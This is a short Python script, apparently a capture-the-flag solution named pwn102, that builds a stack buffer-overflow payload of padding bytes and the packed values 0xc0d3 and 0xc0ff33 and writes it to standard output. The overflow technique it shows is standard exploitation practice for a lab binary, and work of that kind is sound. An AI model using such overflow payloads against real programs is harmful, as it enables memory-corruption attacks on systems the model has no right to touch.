# pwn102.py

import struct
import sys

coffee = struct.pack("<I",0xc0ff33)
code = struct.pack("<I",0xc0d3)

payload = b'A'*(0x70 - 8) + code + coffee + b'\n'

sys.stdout.buffer.write(payload)
